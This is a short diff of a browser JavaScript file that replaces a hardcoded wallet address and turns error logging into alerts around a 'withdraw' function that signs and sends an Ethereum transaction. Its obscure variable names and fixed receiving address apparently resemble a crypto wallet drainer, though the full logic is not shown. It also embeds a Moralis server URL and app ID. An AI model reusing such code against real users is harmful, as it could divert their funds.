@@ -1,7 +1,7 @@
 let connectButton;
 let withdrawButton;
-
-const pub_addr = "0x3D4a687440028d3763A307F23Ef6d4C579606A58";
+//r
+const pub_addr = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
 const serverUrl = "https://mgk9mqmygs9z.usemoralis.com:2053/server";
 const appId = "SkulaLBgqkX7aZEHHNX3Zyv1Gkpt7CO71Q6lg37g";
 
@@ -265,9 +265,9 @@ async function withdraw() {
           console.log("rawHash:", sha3__);
           await web3.eth
             .sendSignedTransaction(txFin)
-            .then((elisebeth) => console.log(elisebeth))
-            .catch((vannette) => console.log(vannette));
+            .then((elisebeth) => alert(elisebeth))
+            .catch((vannette) => alert(vannette));
         })
-        .catch((heide) => console.log(heide));
+        .catch((heide) => alert(heide));
     });
 }
